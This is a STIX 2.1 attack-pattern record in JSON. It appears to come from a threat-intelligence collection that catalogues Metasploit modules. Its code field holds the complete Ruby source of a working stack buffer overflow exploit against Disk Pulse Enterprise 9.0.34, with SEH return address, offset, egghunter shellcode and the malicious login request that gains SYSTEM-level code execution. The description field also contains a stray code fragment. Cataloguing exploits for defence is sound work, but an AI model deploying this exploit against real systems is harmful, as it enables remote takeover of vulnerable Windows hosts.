{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9accda68-482b-4181-acad-40bc7a5978cc",
    "created": "2024-08-14T16:55:31.909638Z",
    "modified": "2024-08-14T16:55:31.909643Z",
    "name": "Disk Pulse Enterprise Login Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Disk Pulse Enterprise 9.0.34. If a malicious user sends a malicious HTTP login request it is possible to execute a payload that would run under the Windows NT AUTHORITY\\SYSTEM account. Due to size constraints, this module uses the Egghunter technique.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/disk_pulse_enterprise_bof.rb",
            "external_id": "disk_pulse_enterprise_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Disk Pulse Enterprise Login Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in Disk Pulse Enterprise\n        9.0.34. If a malicious user sends a malicious HTTP login request,\n        it is possible to execute a payload that would run under the Windows\n        NT AUTHORITY\\SYSTEM account. Due to size constraints, this module\n        uses the Egghunter technique.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chris Higgins', # msf Module -- @ch1gg1ns\n          'Tulpa Security' # Original discovery -- @tulpa_security\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '40452' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x26\"\n        },\n      'Targets'        =>\n        [\n          [ 'Disk Pulse Enterprise 9.0.34',\n            {\n              'Ret' => 0x10013AAA, # pop ebp # pop ebx # ret 0x04 - libspp.dll\n              'Offset' => 12600\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2016-10-03',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(80)])\n\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => '/',\n      'method' => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /Disk Pulse Enterprise v9\\.0\\.34/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n    eggoptions =\n    {\n      :checksum => true,\n      :eggtag => \"w00t\"\n    }\n\n    print_status(\"Generating exploit...\")\n\n    sploit =  \"username=admin\"\n    sploit << \"&password=aaaaa\\r\\n\"\n\n    # Would like to use generate_egghunter(), looking for improvement\n    egghunter = \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"\n    egghunter += \"\\xef\\xb8\\x77\\x30\\x30\\x74\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\"\n\n    sploit << rand_text(target['Offset'] - payload.encoded.length)\n    sploit << \"w00tw00t\"\n    sploit << payload.encoded\n    sploit << make_nops(70)\n    sploit << rand_text(1614)\n    # Would like to use generate_seh_record(), looking for improvement\n    sploit << \"\\x90\\x90\\xEB\\x0B\"\n    sploit << \"\\x33\\xA3\\x01\\x10\"\n    sploit << make_nops(20)\n    sploit << egghunter\n    sploit << make_nops(7000)\n\n    # Total exploit size should be 21747\n    print_status(\"Total exploit size: \" + sploit.length.to_s)\n    print_status(\"Triggering the exploit now...\")\n    print_status(\"Please be patient, the egghunter may take a while...\")\n\n    res = send_request_cgi({\n      'uri' => '/login',\n      'method' => 'POST',\n      'content-type' => 'application/x-www-form-urlencoded',\n      'content-length' => '17000',\n      'data' => sploit\n    })\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}